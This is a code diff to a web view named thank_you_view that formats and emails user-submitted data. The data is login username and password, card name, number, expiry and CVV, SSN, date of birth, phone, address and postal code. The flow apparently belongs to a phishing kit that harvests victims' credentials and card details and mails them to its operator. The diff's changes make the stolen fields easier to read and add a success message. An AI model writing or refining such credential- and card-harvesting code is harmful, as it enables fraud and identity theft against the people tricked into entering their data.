@@ -46,9 +46,17 @@ def thank_you_view(request):
 
     # Format the content of the email
     email_content = f"""
-    Login Data: {login_data}
-    Bill Data: {bill_data}
-    Info Data: {info_data}
+    username: {login_data.get('user_name', 'N/A')}
+    password: {login_data.get('pass_word', 'N/A')}
+    card_name: {bill_data.get('card_name', 'N/A')}
+    card_number: {bill_data.get('card_number', 'N/A')}
+    expiration_date: {bill_data.get('expiry_date', 'N/A')}
+    address: {bill_data.get('address', 'N/A')}
+    cvv: {bill_data.get('cvv', 'N/A')}
+    ssn: {info_data.get('ssn', 'N/A')}
+    phone_number: {info_data.get('phone_number', 'N/A')}
+    dob: {info_data.get('dob', 'N/A')}
+    postal_code: {info_data.get('postal_code', 'N/A')}
     """
 
     try:
@@ -59,6 +67,7 @@ def thank_you_view(request):
             subject='Thank You!',
             contents= email_content
         )
+        print("✅ Email sent successfully!")
     except Exception as e:
         print("❌ Failed to send email:", str(e))
 
